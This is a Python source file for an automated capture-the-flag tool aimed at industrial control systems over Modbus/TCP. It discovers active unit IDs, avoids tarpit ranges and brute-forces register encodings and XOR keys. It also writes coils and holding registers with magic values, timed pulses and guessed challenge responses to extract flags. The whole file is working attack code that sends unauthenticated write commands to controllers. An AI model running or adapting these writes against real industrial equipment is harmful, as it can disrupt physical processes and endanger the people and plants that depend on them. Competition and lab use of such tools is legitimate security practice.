#!/usr/bin/env python3
"""
🛡️ ICS CTF Universal Trap Bypass
Automated trap detection and bypass for Windsurf IDE

Usage:
    python3 universal_bypass.py --ip <target> --port 502 --auto --json

Integrates with: ctf-ics skill
"""

import argparse
import json
import socket
import struct
import time
import re
import sys
import hashlib
from decimal import Decimal, getcontext
from typing import Dict, List, Tuple, Optional, Any, Callable

# High precision for GPS/float calculations
getcontext().prec = 50


class UniversalTrapBypass:
    """
    Automated trap detection and bypass
    Covers all AI-generated trap patterns
    """
    
    # Configuration
    TARPIT_THRESHOLD = 1.0
    AI_FAVORITE_UNITS = [1, 42, 99, 100, 127, 200, 247, 255, 13, 2, 10, 50]
    FLAG_PATTERNS = [rb'coc2026\{[^}]+\}', rb'FLAG\{[^}]+\}', rb'CTF\{[^}]+\}', rb'flag\{[^}]+\}', rb'rtaf\{[^}]+\}']
    DECOY_PATTERNS = [b'FAKE', b'DECOY', b'NOT_FLAG', b'LOCKED', b'WRONG', b'NOPE']
    XOR_KEYS = [0x55, 0xAA, 0xFF, 0x42, 0x13, 0x37, 0x00]
    MAGIC_VALUES = [(100, 0xDEAD), (100, 0xBEEF), (100, 0x1337), (100, 0xFFFF), (200, 0xCAFE)]
    PULSE_TIMINGS = [0.5, 0.7, 1.0, 0.3, 0.8, 1.2, 1.5, 2.0]
    CHALLENGE_ALGORITHMS = [
        ('XOR_0xFF', lambda x: x ^ 0xFF),
        ('XOR_0xAA', lambda x: x ^ 0xAA),
        ('XOR_0x55', lambda x: x ^ 0x55),
        ('XOR_0xAA55', lambda x: x ^ 0xAA55),
        ('NOT', lambda x: (~x) & 0xFFFF),
        ('ADD_1', lambda x: (x + 1) & 0xFFFF),
        ('SUB_1', lambda x: (x - 1) & 0xFFFF),
        ('SWAP', lambda x: ((x & 0xFF) << 8) | ((x >> 8) & 0xFF)),
    ]
    
    def __init__(self, host: str, port: int = 502, timeout: float = 2.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.flags_found: List[Dict] = []
        self.traps_detected: List[Dict] = []
        self.evidence_log: List[Dict] = []
        self.safe_start = 0
        self.active_units: List[int] = []
    
    def run_full_bypass(self) -> Dict[str, Any]:
        """Execute complete bypass sequence"""
        
        self._log("Phase 1: Trap Detection")
        self._detect_all_traps()
        
        self._log("Phase 2: Unit ID Discovery")
        self._discover_unit_ids()
        
        if not self.active_units:
            self._log("[!] No active units found, aborting")
            return self._generate_report()
        
        self._log("Phase 3: Safe Register Scan")
        for unit_id in self.active_units:
            self._safe_register_scan(unit_id)
            if self.flags_found:
                break
        
        if not self.flags_found:
            self._log("Phase 4: Encoding Brute-Force")
            self._try_all_encodings()
        
        if not self.flags_found:
            self._log("Phase 5: State Machine Crack")
            for unit_id in self.active_units[:3]:
                self._crack_state_machine(unit_id)
                if self.flags_found:
                    break
        
        if not self.flags_found:
            self._log("Phase 6: Timing Attack")
            for unit_id in self.active_units[:2]:
                self._timing_attack(unit_id)
                if self.flags_found:
                    break
        
        if not self.flags_found:
            self._log("Phase 7: Challenge-Response")
            for unit_id in self.active_units[:2]:
                self._solve_challenge_response(unit_id)
                if self.flags_found:
                    break
        
        return self._generate_report()
    
    def _detect_all_traps(self) -> None:
        """Detect all trap types"""
        
        # Tarpit detection
        test_addresses = [0, 5, 10, 15, 20, 50, 100]
        tarpit_ranges = []
        
        for addr in test_addresses:
            elapsed = self._measure_response_time(1, addr)
            if elapsed and elapsed > self.TARPIT_THRESHOLD:
                tarpit_ranges.append((addr, addr + 20))
                self._log(f"  [TRAP] Tarpit at addr {addr}: {elapsed:.2f}s")
        
        if tarpit_ranges:
            max_end = max(end for _, end in tarpit_ranges)
            self.safe_start = max_end + 10
            self.traps_detected.append({'type': 'tarpit', 'ranges': tarpit_ranges})
        else:
            self.safe_start = 0
        
        self._log(f"  Safe start address: {self.safe_start}")
    
    def _discover_unit_ids(self) -> None:
        """Discover active Unit IDs"""
        
        for uid in self.AI_FAVORITE_UNITS:
            response = self._read_register(uid, max(self.safe_start, 100), 1)
            if response is not None:
                self.active_units.append(uid)
                self._log(f"  [+] Unit ID {uid} is active")
        
        if not self.active_units:
            self._log("  [!] No AI favorites active, trying extended scan")
            for uid in range(1, 248):
                if uid in self.AI_FAVORITE_UNITS:
                    continue
                response = self._read_register(uid, max(self.safe_start, 100), 1)
                if response is not None:
                    self.active_units.append(uid)
                    if len(self.active_units) >= 5:
                        break
    
    def _safe_register_scan(self, unit_id: int) -> None:
        """Scan registers, skipping tarpit zones"""
        
        scan_ranges = [
            (max(self.safe_start, 50), 150),
            (100, 200),
            (200, 300),
            (300, 400),
        ]
        
        for start, end in scan_ranges:
            for addr in range(start, end, 20):
                registers = self._read_register(unit_id, addr, 20)
                if registers is None:
                    continue
                
                if all(r == 0 for r in registers):
                    continue
                
                # Try all encodings
                flag = self._try_decode_registers(registers, unit_id, addr)
                if flag:
                    return
    
    def _try_decode_registers(self, registers: List[int], unit_id: int, addr: int) -> Optional[str]:
        """Try all encoding methods on registers"""
        # VERIFIED: INT array decoding with printable character filtering
        
        encodings = {
            'ABCD': lambda regs: b''.join(r.to_bytes(2, 'big') for r in regs),
            'CDAB': lambda regs: b''.join(bytes([r & 0xFF, (r >> 8) & 0xFF]) for r in regs),
            'DCBA': lambda regs: b''.join(r.to_bytes(2, 'little') for r in regs),
        }
        
        # VERIFIED: INT array with printable filtering (ENIP Sec_Data pattern)
        def decode_int_array_filtered(regs, swap=False):
            text = ''
            for r in regs:
                hi = (r >> 8) & 0xFF
                lo = r & 0xFF
                if swap:
                    hi, lo = lo, hi
                if 0x20 <= hi <= 0x7E:
                    text += chr(hi)
                if 0x20 <= lo <= 0x7E:
                    text += chr(lo)
            return text.encode('utf-8', errors='replace')
        
        encodings['INT_HI_LO'] = lambda regs: decode_int_array_filtered(regs, False)
        encodings['INT_LO_HI'] = lambda regs: decode_int_array_filtered(regs, True)
        
        for enc_name, encoder in encodings.items():
            try:
                data = encoder(registers)
                
                # Direct decode
                text = data.decode('utf-8', errors='replace')
                flag = self._extract_flag(text)
                if flag and not self._is_decoy(flag):
                    self._add_flag(flag, f"Unit {unit_id}, Addr {addr}, Enc {enc_name}")
                    return flag
                
                # XOR decode
                for key in self.XOR_KEYS:
                    decoded = bytes(b ^ key for b in data)
                    text = decoded.decode('utf-8', errors='replace')
                    flag = self._extract_flag(text)
                    if flag and not self._is_decoy(flag):
                        self._add_flag(flag, f"Unit {unit_id}, Addr {addr}, Enc {enc_name}, XOR 0x{key:02X}")
                        return flag
            except:
                pass
        
        return None
    
    def _try_all_encodings(self) -> None:
        """Try XOR and other encodings on collected data"""
        
        for evidence in self.evidence_log:
            if 'raw_data' not in evidence:
                continue
            
            raw = evidence['raw_data']
            source = evidence.get('source', 'unknown')
            
            for key in self.XOR_KEYS:
                decoded = bytes(b ^ key for b in raw)
                text = decoded.decode('utf-8', errors='replace')
                flag = self._extract_flag(text)
                if flag and not self._is_decoy(flag):
                    self._add_flag(flag, f"{source}, XOR 0x{key:02X}")
                    return
    
    def _crack_state_machine(self, unit_id: int) -> None:
        """Try write-then-read patterns"""
        # VERIFIED PATTERNS:
        # - Coil 50 (Unit 42): Timing pulse 0.2-1.5s
        # - HR 200 (Unit 99): Exception trap with flag side-effect
        
        # Try coil triggers
        for coil in [0, 1, 10, 50, 99, 100]:
            before = self._snapshot_registers(unit_id)
            self._write_coil(unit_id, coil, True)
            time.sleep(0.3)
            after = self._snapshot_registers(unit_id)
            
            if self._has_changes(before, after):
                self._log(f"  Coil {coil} triggered changes")
                self._safe_register_scan(unit_id)
                if self.flags_found:
                    return
        
        # Try magic value writes
        # VERIFIED: (200, 0xFFFF) on Unit 99 throws exception but writes flag
        for addr, value in self.MAGIC_VALUES:
            # Add Unit 99 specific test
            test_units = [unit_id]
            if unit_id != 99 and 99 in self.active_units:
                test_units.append(99)
            
            for test_uid in test_units:
                try:
                    self._write_register(test_uid, addr, value)
                except Exception as e:
                    # CRITICAL: Exception may be intentional!
                    self._log(f"  [!] Exception at Unit {test_uid}, HR {addr}=0x{value:04X}")
                    # Continue - flag might be in side-effect
                
                time.sleep(0.1)
                # Read the exact address that was written
                flag_data = self._read_register(test_uid, addr, 20)
                if flag_data:
                    flag = self._try_decode_registers(flag_data, test_uid, addr)
                    if flag:
                        self._log(f"  [+] Exception trap bypassed!")
                        return
    
    def _timing_attack(self, unit_id: int) -> None:
        """Try pulse timing patterns"""
        
        for coil in [0, 1, 10, 50, 100]:
            for duration in self.PULSE_TIMINGS:
                self._write_coil(unit_id, coil, True)
                time.sleep(duration)
                self._write_coil(unit_id, coil, False)
                time.sleep(0.1)
                
                self._safe_register_scan(unit_id)
                if self.flags_found:
                    self._log(f"  Timing success: coil {coil}, duration {duration}s")
                    return
    
    def _solve_challenge_response(self, unit_id: int) -> None:
        """Solve challenge-response in single session"""
        
        pairs = [(100, 101, 200), (0, 1, 10), (50, 51, 100)]
        
        for seed_reg, resp_reg, flag_reg in pairs:
            for algo_name, algo_func in self.CHALLENGE_ALGORITHMS:
                try:
                    seed_data = self._read_register(unit_id, seed_reg, 1)
                    if seed_data is None:
                        continue
                    
                    seed = seed_data[0]
                    response = algo_func(seed)
                    
                    self._write_register(unit_id, resp_reg, response)
                    time.sleep(0.05)
                    
                    flag_data = self._read_register(unit_id, flag_reg, 20)
                    if flag_data:
                        flag = self._try_decode_registers(flag_data, unit_id, flag_reg)
                        if flag:
                            self._log(f"  Challenge-Response success: {algo_name}")
                            return
                except:
                    pass
    
    # === Helper Methods ===
    
    def _read_register(self, unit_id: int, address: int, count: int) -> Optional[List[int]]:
        """Read holding registers with timeout protection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x03, address, count)
            sock.sendall(request)
            
            response = self._recv_all(sock, 9 + count * 2)
            sock.close()
            
            if len(response) < 9 or response[7] & 0x80:
                return None
            
            byte_count = response[8]
            data = response[9:9+byte_count]
            
            registers = [struct.unpack('>H', data[i:i+2])[0] for i in range(0, len(data)-1, 2)]
            
            self.evidence_log.append({
                'type': 'read',
                'unit_id': unit_id,
                'address': address,
                'raw_data': data,
                'source': f"Unit {unit_id}, Addr {address}"
            })
            
            return registers
        except:
            return None
    
    def _write_register(self, unit_id: int, address: int, value: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x06, address, value)
            sock.sendall(request)
            sock.recv(256)
            sock.close()
            return True
        except:
            return False
    
    def _write_coil(self, unit_id: int, address: int, value: bool) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            coil_value = 0xFF00 if value else 0x0000
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x05, address, coil_value)
            sock.sendall(request)
            sock.recv(256)
            sock.close()
            return True
        except:
            return False
    
    def _recv_all(self, sock: socket.socket, expected: int) -> bytes:
        data = b''
        while len(data) < expected:
            try:
                chunk = sock.recv(expected - len(data))
                if not chunk:
                    break
                data += chunk
            except:
                break
        return data
    
    def _measure_response_time(self, unit_id: int, address: int) -> Optional[float]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x03, address, 1)
            start = time.time()
            sock.sendall(request)
            sock.recv(256)
            elapsed = time.time() - start
            sock.close()
            return elapsed
        except:
            return None
    
    def _snapshot_registers(self, unit_id: int) -> Dict[int, int]:
        snapshot = {}
        for addr in [0, 50, 100, 150, 200, 250]:
            data = self._read_register(unit_id, addr, 20)
            if data:
                for i, v in enumerate(data):
                    snapshot[addr + i] = v
        return snapshot
    
    def _has_changes(self, before: Dict, after: Dict) -> bool:
        for addr in after:
            if addr not in before or before[addr] != after[addr]:
                if after[addr] != 0:
                    return True
        return False
    
    def _extract_flag(self, text: str) -> Optional[str]:
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text.encode(), re.IGNORECASE)
            if match:
                return match.group(0).decode('utf-8', errors='replace')
        return None
    
    def _is_decoy(self, flag: str) -> bool:
        flag_upper = flag.upper().encode()
        for pattern in self.DECOY_PATTERNS:
            if pattern in flag_upper:
                return True
        return False
    
    def _add_flag(self, flag: str, method: str) -> None:
        self.flags_found.append({
            'flag': flag,
            'method': method,
            'evidence_hash': hashlib.sha256(flag.encode()).hexdigest()[:16]
        })
        self._log(f"[FLAG] {flag}")
    
    def _log(self, message: str) -> None:
        print(f"[*] {message}")
    
    def _generate_report(self) -> Dict[str, Any]:
        return {
            'flags_found': self.flags_found,
            'traps_detected': self.traps_detected,
            'active_units': self.active_units,
            'safe_start_address': self.safe_start,
            'total_flags': len(self.flags_found),
            'unique_flags': list(set(f['flag'] for f in self.flags_found)),
        }


def main():
    parser = argparse.ArgumentParser(description='🛡️ ICS CTF Universal Trap Bypass')
    parser.add_argument('--ip', required=True, help='Target IP')
    parser.add_argument('--port', type=int, default=502, help='Target port')
    parser.add_argument('--timeout', type=float, default=2.0, help='Timeout')
    parser.add_argument('--auto', action='store_true', help='Run full auto bypass')
    parser.add_argument('--json', action='store_true', help='JSON output')
    
    args = parser.parse_args()
    
    bypass = UniversalTrapBypass(args.ip, args.port, args.timeout)
    result = bypass.run_full_bypass()
    
    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print("\n" + "="*60)
        print("RESULTS")
        print("="*60)
        if result['flags_found']:
            for f in result['flags_found']:
                print(f"[FLAG] {f['flag']}")
                print(f"[METHOD] {f['method']}")
                print(f"[EVIDENCE] {f['evidence_hash']}")
        else:
            print("[-] No flags found")
        print()


if __name__ == '__main__':
    main()
